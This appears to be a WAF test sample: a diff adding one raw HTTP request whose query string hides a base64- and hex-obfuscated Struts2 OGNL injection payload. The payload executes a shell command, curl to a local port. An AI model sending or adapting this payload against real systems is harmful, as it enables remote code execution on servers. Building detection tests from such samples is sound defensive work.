@@ -1,0 +1,13 @@
+POST /streamline/watch?arbitrary=miscellaneous&notation=scan&comma=create&subsidiary=KCNjb250ZXh0PSNhdHRyWydceDczJysnXHg3NCcrJ1x4NzInKydceDc1JysnXHg3NCcrJ1x4NzMnKydceDJlJysnXHg3NicrJ1x4NjEnKydceDZjJysnXHg3NScrJ1x4NjUnKydceDUzJysnXHg3NCcrJ1x4NjEnKydceDYzJysnXHg2YicgXS5jb250ZXh0KS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKEBvZ25sLk9nbmxDb250ZXh0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykpLihAamF2YS5sYW5nLlJ1bnRpbWVAZ2V0UnVudGltZSgpLmV4ZWMoJ1x4NjMnKydceDc1JysnXHg3MicrJ1x4NmMnKydceDIwJysnXHgzMScrJ1x4MzInKydceDM3JysnXHgyZScrJ1x4MzAnKydceDJlJysnXHgzMCcrJ1x4MmUnKydceDMxJysnXHgzYScrJ1x4MzknKydceDMwJysnXHgzMCcrJ1x4MzEnICkp HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
+Cookie: left%20arrow=rapid; message=composite; granular=escalate; SESSIONID=1ef10c7e019849953d16848a6856c21e88a12936e510bc7869d180e7ee7099e0e3cd2b9b090220ae7b3761e3e588a93e
+
